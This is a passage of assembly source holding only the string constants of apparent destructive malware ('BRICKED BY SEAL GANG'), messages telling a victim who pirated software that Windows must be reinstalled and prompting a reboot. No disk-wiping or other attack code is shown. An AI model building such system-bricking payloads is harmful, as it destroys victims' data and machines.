...
Message db "BRICKED BY SEAL GANG", 0x0 
MessageB db "Next time don't pirate crap.", 0x0
MessageC db "Welp, guess you'll have to reinstall Windows now. Or Linux.", 0x0
AnyKey db "Press any key to reboot (so you can install Linux)", 0x0 
